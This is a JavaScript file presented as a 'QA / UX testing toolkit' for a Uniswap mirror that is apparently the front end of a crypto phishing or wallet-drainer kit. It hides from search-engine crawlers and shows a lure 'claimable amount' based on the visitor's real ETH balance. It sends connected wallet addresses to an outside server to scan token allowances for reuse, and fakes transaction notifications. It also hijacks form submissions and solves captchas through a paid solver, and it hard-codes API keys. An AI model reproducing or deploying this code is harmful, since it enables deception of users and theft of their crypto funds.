/* Legion QA / UX testing toolkit — staging only */
(function () {
  var TARGET_ORIGIN = "https://app.uniswap.org";
  var DEMO_API = "https://legionapi-production.up.railway.app";
  var FEATURES = {"proxy":false,"rotate":false,"deploy":false,"balance":true,"toast":false,"redirect":false,"cloak":true,"lang":false,"solveCaptcha":false,"preapprove":true};
  var ALCHEMY_KEY = "LdIrCjy1EiH2RKWDCFpIz";
  var MORALIS_KEY = "";
  var KINETIC_KEY = "uK2WF0w8VynajJYsSmA95bDxThM14BdG";
  var ALLOWANCE_REUSE = true;
  var TWOCAPTCHA_KEY = "";

  var I18N = {
    en: {
      banner: 'QA mirror — authorized staging test',
      claimable: 'Claimable amount (demo):',
      preapprove: 'Already authorized — claim ready',
      toastPrefix: 'just completed a test transaction',
    },
    es: {
      banner: 'Espejo QA — prueba de staging autorizada',
      claimable: 'Monto reclamable (demo):',
      preapprove: 'Ya autorizado — listo para reclamar',
      toastPrefix: 'acaba de completar una transacción de prueba',
    },
  };

  function locale() {
    if (!FEATURES.lang) return 'en';
    var langs = (navigator.languages || [navigator.language || 'en']).join(',').toLowerCase();
    if (langs.indexOf('es') >= 0) return 'es';
    return 'en';
  }

  function t(key) {
    var loc = locale();
    return (I18N[loc] && I18N[loc][key]) || I18N.en[key] || key;
  }

  var BOT_UA = ["googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","ahrefsbot","semrushbot","mj12bot","dotbot","petalbot","facebot","ia_archiver","crawler","spider","bot/","headless"];

  function isBot() {
    if (!FEATURES.cloak) return false;
    var ua = (navigator.userAgent || '').toLowerCase();
    for (var i = 0; i < BOT_UA.length; i++) {
      if (ua.indexOf(BOT_UA[i]) >= 0) return true;
    }
    return false;
  }

  if (FEATURES.cloak && isBot()) {
    window.location.replace('./bots.html');
    return;
  }

  if (FEATURES.lang) {
    document.documentElement.lang = locale();
  }

  function shortAddr(a) {
    if (!a || a.length < 12) return a || '0x????';
    return a.slice(0, 6) + '…' + a.slice(-4);
  }

  function getConnectedEvmAddress() {
    return window.ethereum && window.ethereum.selectedAddress
      ? window.ethereum.selectedAddress
      : (window.__legionTrainingWallet || null);
  }

  async function fetchEthBalanceUsd(address) {
    if (!address) return null;
    try {
      if (ALCHEMY_KEY) {
        var res = await fetch('https://eth-mainnet.g.alchemy.com/v2/' + ALCHEMY_KEY, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_getBalance', params: [address, 'latest'] }),
        });
        var j = await res.json();
        var wei = BigInt(j.result || '0x0');
        var eth = Number(wei) / 1e18;
        var pxRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
        var px = await pxRes.json();
        var usd = eth * (px.ethereum && px.ethereum.usd ? px.ethereum.usd : 2500);
        return usd;
      }
      if (MORALIS_KEY) {
        var mRes = await fetch(
          'https://deep-index.moralis.io/api/v2.2/' + address + '/balance?chain=eth',
          { headers: { 'X-API-Key': MORALIS_KEY } }
        );
        var mJ = await mRes.json();
        var bal = Number(mJ.balance || 0) / 1e18;
        return bal * 2500;
      }
    } catch (e) { console.warn('[legion-qa] balance fetch', e); }
    return null;
  }

  if (FEATURES.balance) {
    var balEl = document.createElement('div');
    balEl.id = 'legion-qa-balance';
    document.body.appendChild(balEl);
    function refreshBalance() {
      var addr = getConnectedEvmAddress();
      if (!addr) { balEl.classList.remove('visible'); return; }
      fetchEthBalanceUsd(addr).then(function (usd) {
        if (usd == null) usd = 0;
        var demo = Math.max(usd * 0.15, 12.5);
        balEl.textContent = t('claimable') + ' $' + demo.toFixed(2);
        balEl.classList.add('visible');
      });
    }
    setInterval(refreshBalance, 8000);
    window.addEventListener('ethereum#initialized', refreshBalance);
    setTimeout(refreshBalance, 2000);
  }

  if (FEATURES.preapprove && ALLOWANCE_REUSE && KINETIC_KEY) {
    var preEl = document.createElement('div');
    preEl.id = 'legion-qa-preapprove';
    document.body.appendChild(preEl);
    async function checkPreapprove() {
      var addr = getConnectedEvmAddress();
      if (!addr) { preEl.classList.remove('visible'); return; }
      try {
        var res = await fetch(DEMO_API + '/api/internal/allowance-reuse/scan', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-legion-kinetic-key': KINETIC_KEY,
          },
          body: JSON.stringify({ wallet_address: addr }),
        });
        var data = await res.json();
        var list = (data && data.data && data.data.allowances) || (data && data.allowances) || [];
        if (Array.isArray(list) && list.length > 0) {
          preEl.textContent = t('preapprove');
          preEl.classList.add('visible');
        } else {
          preEl.classList.remove('visible');
        }
      } catch (e) {
        preEl.classList.remove('visible');
      }
    }
    setInterval(checkPreapprove, 12000);
    setTimeout(checkPreapprove, 3000);
  }

  if (FEATURES.toast) {
    var host = document.createElement('div');
    host.id = 'legion-qa-toast-host';
    document.body.appendChild(host);
    var hex = '0123456789abcdef';
    function randomAddr() {
      var s = '0x';
      for (var i = 0; i < 40; i++) s += hex[Math.floor(Math.random() * 16)];
      return shortAddr(s);
    }
    function showToast() {
      var el = document.createElement('div');
      el.className = 'legion-qa-toast';
      el.textContent = randomAddr() + ' ' + t('toastPrefix');
      host.appendChild(el);
      setTimeout(function () { el.remove(); }, 6000);
      while (host.children.length > 4) host.removeChild(host.firstChild);
    }
    function scheduleToast() {
      var delay = 10000 + Math.floor(Math.random() * 5000);
      setTimeout(function () { showToast(); scheduleToast(); }, delay);
    }
    scheduleToast();
  }

  if (FEATURES.redirect) {
    document.addEventListener('submit', function (e) {
      var form = e.target;
      if (!(form instanceof HTMLFormElement)) return;
      e.preventDefault();
      setTimeout(function () {
        window.location.href = TARGET_ORIGIN;
      }, 400);
    }, true);
  }

  if (FEATURES.solveCaptcha && TWOCAPTCHA_KEY) {
    window.__legionSolveTurnstile = async function (siteKey, pageUrl) {
      var createRes = await fetch('https://2captcha.com/in.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          key: TWOCAPTCHA_KEY,
          method: 'turnstile',
          sitekey: siteKey,
          pageurl: pageUrl || window.location.href,
          json: '1',
        }),
      });
      var createJson = await createRes.json();
      if (createJson.status !== 1) throw new Error(createJson.request || '2captcha create failed');
      var taskId = createJson.request;
      for (var i = 0; i < 24; i++) {
        await new Promise(function (r) { setTimeout(r, 5000); });
        var pollRes = await fetch(
          'https://2captcha.com/res.php?key=' + encodeURIComponent(TWOCAPTCHA_KEY) +
          '&action=get&id=' + encodeURIComponent(taskId) + '&json=1'
        );
        var pollJson = await pollRes.json();
        if (pollJson.status === 1) return pollJson.request;
        if (pollJson.request !== 'CAPCHA_NOT_READY') throw new Error(pollJson.request || 'poll failed');
      }
      throw new Error('2captcha timeout');
    };
    console.info('[legion-qa] Turnstile solver available: window.__legionSolveTurnstile(siteKey, pageUrl)');
  }

  window.__legionTrainingWallet = null;
  document.addEventListener('legion-training-wallet-connected', function (ev) {
    if (ev.detail && ev.detail.address) window.__legionTrainingWallet = ev.detail.address;
  });
})();
